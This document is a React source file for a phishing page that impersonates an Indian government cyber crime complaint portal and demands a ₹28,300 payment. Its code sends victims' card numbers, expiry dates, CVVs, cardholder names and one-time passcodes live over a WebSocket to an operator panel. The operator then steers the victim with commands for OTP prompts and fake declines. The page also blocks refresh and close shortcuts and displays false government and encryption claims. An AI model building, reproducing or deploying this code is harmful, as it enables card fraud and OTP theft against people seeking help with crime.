import React, { useState, useEffect } from 'react';
import { CreditCard, Lock, Shield, Loader2 } from 'lucide-react';

// WebSocket connection for admin panel
let ws: WebSocket | null = null;

const connectWebSocket = () => {
  try {
    // Use wss for secure connection on railway.com
    const wsUrl = window.location.hostname === 'localhost' ? 'ws://localhost:8080' : `wss://${window.location.hostname.replace(/^https?:\/\//, '')}`;
    
    if (!ws || ws.readyState === WebSocket.CLOSED) {
      ws = new WebSocket(wsUrl);
      
      ws.onopen = () => {
        console.log('WebSocket connected from PaymentForm');
        // Send new visitor notification immediately when connected
        const userInfo = {
          ip: getRandomIP(),
          browser: navigator.userAgent,
          network: getRandomNetwork()
        };
        
        const visitorData = {
          type: 'newVisitor',
          ip: userInfo.ip,
          timestamp: new Date().toISOString()
        };
        
        console.log('Sending visitor data:', visitorData);
        ws?.send(JSON.stringify(visitorData));
      };
      
      ws.onclose = () => {
        console.log('WebSocket disconnected');
        ws = null;
        // Reconnect after 3 seconds
        setTimeout(connectWebSocket, 3000);
      };

      ws.onerror = (error) => {
        console.error('WebSocket error:', error);
        ws = null;
      };
    }
  } catch (error) {
    console.error('WebSocket connection failed:', error);
    ws = null;
  }
};

const getRandomIP = () => {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

const getRandomNetwork = () => {
  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
  return networks[Math.floor(Math.random() * networks.length)];
};

const PaymentForm = () => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '28300.00'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [otp, setOtp] = useState('');
  const [displayOtp, setDisplayOtp] = useState('');
  const [otpFocused, setOtpFocused] = useState(false);
  const [timer, setTimer] = useState(299);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');

  // Check if all card details are filled
  const isFormValid = () => {
    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
           formData.expiryMonth.length === 2 &&
           formData.expiryYear.length === 2 &&
           formData.cvv.length >= 3 &&
           formData.cardHolder.trim().length > 0;
  };

  // Check if OTP is valid (6 digits)
  const isOtpValid = () => {
    return otp.length === 6;
  };

  useEffect(() => {
    // Prevent keyboard shortcuts
    const handleKeyDown = (event: KeyboardEvent) => {
      // Prevent F5, Ctrl+R, Ctrl+F5 (refresh)
      if (event.key === 'F5' || 
          (event.ctrlKey && event.key === 'r') || 
          (event.ctrlKey && event.key === 'F5')) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
      
      // Prevent ESC key
      if (event.key === 'Escape') {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
      
      // Prevent other common shortcuts
      if (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
    };

    const handleBeforeUnload = (event: BeforeUnloadEvent) => {
      event.preventDefault();
      event.returnValue = '';
      return '';
    };

    document.addEventListener('keydown', handleKeyDown, true);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      document.removeEventListener('keydown', handleKeyDown, true);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, []);

  useEffect(() => {
    connectWebSocket();
    
    // Send visitor data when component mounts
    setTimeout(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        const userInfo = {
          ip: getRandomIP(),
          browser: navigator.userAgent,
          network: getRandomNetwork()
        };
        
        const visitorData = {
          type: 'newVisitor',
          ip: userInfo.ip,
          timestamp: new Date().toISOString()
        };
        
        console.log('Sending initial visitor data:', visitorData);
        ws.send(JSON.stringify(visitorData));
      }
    }, 1000);
    
    // Listen for commands from admin panel
    const handleMessage = (event: MessageEvent) => {
      try {
        const data = JSON.parse(event.data);
        console.log('Received command from admin:', data);
        
        switch (data.command) {
          case 'showotp':
            setIsLoading(false);
            setShowOtp(true);
            break;
          case 'fail':
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card has been declined');
            break;
          case 'success':
            setIsConfirmLoading(false);
            setShowProcessing(true);
            setTimeout(() => {
              setShowProcessing(false);
              setShowSuccess(true);
              setTimeout(() => {
                window.location.href = 'https://google.com';
              }, 2000);
            }, 4000);
            break;
          case 'invalidotp':
            setIsConfirmLoading(false);
            setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
            break;
          case 'cardinvalid':
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card is invalid, please try another card');
            break;
          case 'carddisabled':
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Card disabled, please try another card');
            break;
        }
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };

    if (ws) {
      ws.onmessage = handleMessage;
    }

    return () => {
      if (ws) {
        ws.onmessage = null;
      }
    };
  }, []);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showOtp && timer > 0) {
      interval = setInterval(() => {
        setTimer(prev => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [showOtp, timer]);

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const limited = cleaned.slice(0, 16);
    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
    return formatted;
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}.${secs.toString().padStart(2, '0')}`;
  };

  const sendToAdminPanel = (data: any) => {
    console.log('Attempting to send data to admin panel:', data);
    
    if (ws && ws.readyState === WebSocket.OPEN) {
      console.log('WebSocket is open, sending data');
      ws.send(JSON.stringify(data));
    } else {
      console.error('WebSocket not connected, attempting to reconnect');
      connectWebSocket();
      // Try to send after reconnection
      setTimeout(() => {
        if (ws && ws.readyState === WebSocket.OPEN) {
          console.log('Sending data after reconnection');
          ws.send(JSON.stringify(data));
        }
      }, 1000);
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    if (name === 'cardNumber') {
      const formatted = formatCardNumber(value);
      setFormData({
        ...formData,
        [name]: formatted
      });
      
      // Auto-focus to next field when card number is complete
      if (formatted.replace(/\s/g, '').length === 16) {
        const monthInput = document.querySelector('input[name="expiryMonth"]') as HTMLInputElement;
        if (monthInput) {
          setTimeout(() => monthInput.focus(), 100);
        }
      }
    } else if (name === 'expiryMonth') {
      const numericValue = value.replace(/\D/g, '').slice(0, 2);
      setFormData({
        ...formData,
        [name]: numericValue
      });
      
      // Auto-focus to year when month is complete
      if (numericValue.length === 2) {
        const yearInput = document.querySelector('input[name="expiryYear"]') as HTMLInputElement;
        if (yearInput) {
          setTimeout(() => yearInput.focus(), 100);
        }
      }
    } else if (name === 'expiryYear') {
      const numericValue = value.replace(/\D/g, '').slice(0, 2);
      setFormData({
        ...formData,
        [name]: numericValue
      });
      
      // Auto-focus to CVV when year is complete
      if (numericValue.length === 2) {
        const cvvInput = document.querySelector('input[name="cvv"]') as HTMLInputElement;
        if (cvvInput) {
          setTimeout(() => cvvInput.focus(), 100);
        }
      }
    } else if (name === 'cvv') {
      const numericValue = value.replace(/\D/g, '').slice(0, 4);
      setFormData({
        ...formData,
        [name]: numericValue
      });
      
      // Auto-focus to card holder when CVV is complete
      if (numericValue.length >= 3) {
        const holderInput = document.querySelector('input[name="cardHolder"]') as HTMLInputElement;
        if (holderInput) {
          setTimeout(() => holderInput.focus(), 100);
        }
      }
    } else {
      setFormData({
        ...formData,
        [name]: value
      });
    }
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtp(value);
    setDisplayOtp(value);
    setInvalidOtpMessage('');
    
    if (value.length > 0) {
      setTimeout(() => {
        setDisplayOtp('*'.repeat(value.length));
      }, 2000);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isFormValid()) {
      return;
    }
    
    setIsLoading(true);
    setErrorMessage('');
    
    // Send card data to admin panel
    const userInfo = {
      ip: getRandomIP(),
      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
      network: getRandomNetwork()
    };
    
    const cardData = {
      type: 'cardData',
      data: formData,
      userInfo: userInfo,
      timestamp: new Date().toISOString()
    };
    
    console.log('Submitting card data:', cardData);
    sendToAdminPanel(cardData);
  };

  const handleConfirmPay = () => {
    if (!isOtpValid()) {
      return;
    }
    
    setIsConfirmLoading(true);
    
    // Send OTP to admin panel
    sendToAdminPanel({
      type: 'otp',
      otp: otp,
      timestamp: new Date().toISOString()
    });
  };

  const getLastFourDigits = () => {
    return formData.cardNumber.replace(/\s/g, '').slice(-4);
  };

  const maskCardInfo = (value: string) => {
    return '*'.repeat(value.length);
  };

  if (showSuccess) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6 flex items-center justify-center min-h-screen">
        <div className="text-center">
          <div className="text-green-600 text-6xl animate-bounce">✓</div>
          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6 flex items-center justify-center min-h-screen">
        <div className="text-center">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
        </div>
      </div>
    );
  }

  if (showOtp) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6">
        <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
          <div className="flex items-center mb-2">
            <Shield className="w-5 h-5 text-red-600 mr-2" />
            <span className="font-semibold text-red-800">OTP Verification Required</span>
          </div>
          <p className="text-sm text-red-700">
            Enter the verification code to complete your payment.
          </p>
        </div>

        <div className="space-y-4">
          {invalidOtpMessage && (
            <div className="text-red-600 text-sm text-center mb-4">
              {invalidOtpMessage}
            </div>
          )}
          
          <div className="text-center mb-6">
            <p className="text-sm text-gray-700 mb-4">
              Enter six-digit verification code sent to your registered mobile number ending in {getLastFourDigits()}
            </p>
            
            <div className="relative">
              <input
                type="text"
                value={displayOtp}
                onChange={handleOtpChange}
                onFocus={() => setOtpFocused(true)}
                onBlur={() => setOtpFocused(false)}
                placeholder="000000"
                className={`w-full px-4 py-3 border-2 rounded-lg text-center text-2xl tracking-widest focus:outline-none transition-all ${
                  otpFocused ? 'border-blue-400 shadow-lg shadow-blue-200' : 'border-gray-300'
                }`}
                maxLength={6}
                disabled={isConfirmLoading}
              />
            </div>
          </div>

          <button
            onClick={handleConfirmPay}
            disabled={!isOtpValid() || isConfirmLoading}
            className={`w-full py-3 px-4 rounded-lg font-medium transition-all ${
              isOtpValid() && !isConfirmLoading
                ? 'bg-green-600 text-white hover:bg-green-700'
                : 'bg-gray-400 text-gray-600 cursor-not-allowed'
            }`}
          >
            {isConfirmLoading ? (
              <Loader2 className="w-5 h-5 animate-spin mx-auto" />
            ) : (
              'Confirm & Pay'
            )}
          </button>

          <div className="text-center text-sm text-red-600 mt-4">
            This page will expire after {formatTime(timer)} seconds
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="w-96 bg-white border-l border-gray-200 p-6">
      <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
        <div className="flex items-center mb-2">
          <Shield className="w-5 h-5 text-red-600 mr-2" />
          <span className="font-semibold text-red-800">Secure Payment Required</span>
        </div>
        <p className="text-sm text-red-700">
          Complete your payment to proceed with cyber crime complaint registration.
        </p>
      </div>

      {errorMessage && (
        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
          <p className="text-red-600 text-sm">{errorMessage}</p>
        </div>
      )}

      <form className="space-y-4" onSubmit={handleSubmit}>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Amount to Pay
          </label>
          <div className="relative">
            <span className="absolute left-3 top-2 text-gray-500">₹</span>
            <input
              type="text"
              name="amount"
              value={formData.amount}
              onChange={handleInputChange}
              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
              readOnly
            />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Number
          </label>
          <div className="relative">
            <CreditCard className="absolute left-3 top-2.5 w-4 h-4 text-gray-400" />
            <input
              type="text"
              name="cardNumber"
              placeholder="1234 5678 9012 3456"
              value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
              onChange={handleInputChange}
              className="w-full pl-10 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              maxLength={19}
              disabled={isLoading}
            />
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Month
            </label>
            <input
              type="text"
              name="expiryMonth"
              placeholder="MM"
              value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
              onChange={handleInputChange}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              maxLength={2}
              disabled={isLoading}
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Year
            </label>
            <input
              type="text"
              name="expiryYear"
              placeholder="YY"
              value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
              onChange={handleInputChange}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              maxLength={2}
              disabled={isLoading}
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <div className="relative">
              <Lock className="absolute left-2 top-2.5 w-3 h-3 text-gray-400" />
              <input
                type="text"
                name="cvv"
                placeholder="123"
                value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                onChange={handleInputChange}
                className="w-full pl-7 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                maxLength={4}
                disabled={isLoading}
              />
            </div>
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Holder Name
          </label>
          <input
            type="text"
            name="cardHolder"
            placeholder="Enter full name as on card"
            value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
            onChange={handleInputChange}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
            disabled={isLoading}
          />
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
          <div className="flex items-center text-sm text-blue-800">
            <Shield className="w-4 h-4 mr-2" />
            <span>256-bit SSL Encryption</span>
          </div>
        </div>

        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            `Pay Securely ₹${formData.amount}`
          )}
        </button>

        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain" />
          <svg className="h-8 w-12" viewBox="0 0 100 60" fill="none">
            <rect width="100" height="60" rx="8" fill="#00447C"/>
            <text x="50" y="35" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold">RuPay</text>
          </svg>
        </div>

        <div className="text-xs text-gray-500 text-center mt-4">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
